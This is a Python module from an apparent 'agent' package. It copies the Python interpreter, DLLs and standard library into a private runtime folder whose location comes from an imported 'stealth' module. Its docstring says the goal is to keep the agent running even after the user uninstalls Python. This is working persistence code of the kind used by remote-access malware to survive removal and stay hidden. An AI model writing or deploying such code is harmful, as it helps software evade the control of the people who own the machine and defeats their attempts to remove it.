"""Keeps a private copy of the Python interpreter next to the agent.

If the user uninstalls Python, the agent keeps running from its own copy.
"""

from __future__ import annotations

import os
import shutil
import sys

from . import stealth

STAMP_NAME = ".runtime-stamp"

SKIP_DIRECTORIES = {"__pycache__", "test", "tests", "idlelib", "turtledemo",
                    "ensurepip", "venv", "site-packages"}


def runtime_directory() -> str:
    """Where the private interpreter lives."""
    return os.path.join(stealth.primary_directory(), "runtime")


def private_python() -> str | None:
    """Path to the private interpreter, or ``None``."""
    for name in ("pythonw.exe", "python.exe", "python3", "python"):
        candidate = os.path.join(runtime_directory(), name)
        if os.path.exists(candidate):
            return candidate
    return None


def interpreter() -> str:
    """The interpreter used for child processes."""
    if sys.executable and os.path.exists(sys.executable):
        return sys.executable
    return private_python() or "python"


def ensure() -> str | None:
    """Copy the current interpreter and its stdlib next to the agent."""
    if getattr(sys, "frozen", False):
        return runtime_directory()

    home = os.path.dirname(os.path.abspath(sys.executable))
    target = runtime_directory()
    if os.path.abspath(home) == os.path.abspath(target):
        return target

    stamp = f"{sys.executable}|{sys.version.split()[0]}"
    stamp_path = os.path.join(target, STAMP_NAME)
    try:
        with open(stamp_path, "r", encoding="utf-8") as handle:
            if private_python() and handle.read() == stamp:
                return target
    except OSError:
        pass

    try:
        os.makedirs(target, exist_ok=True)
        for name in os.listdir(home):
            source = os.path.join(home, name)
            if not os.path.isfile(source):
                continue
            if name.lower().endswith((".exe", ".dll", ".zip")) or name.startswith("python"):
                shutil.copy2(source, os.path.join(target, name))

        for sub in ("DLLs", "libs"):
            source = os.path.join(home, sub)
            if os.path.isdir(source):
                shutil.copytree(source, os.path.join(target, sub), dirs_exist_ok=True)

        library = os.path.join(home, "Lib")
        if os.path.isdir(library):
            shutil.copytree(
                library, os.path.join(target, "Lib"), dirs_exist_ok=True,
                ignore=shutil.ignore_patterns(*SKIP_DIRECTORIES),
            )

        with open(stamp_path, "w", encoding="utf-8") as handle:
            handle.write(stamp)
        return target
    except OSError:
        return None


def system_python_gone() -> bool:
    """``True`` when the interpreter we started from no longer exists."""
    return not getattr(sys, "frozen", False) and not os.path.exists(sys.executable)
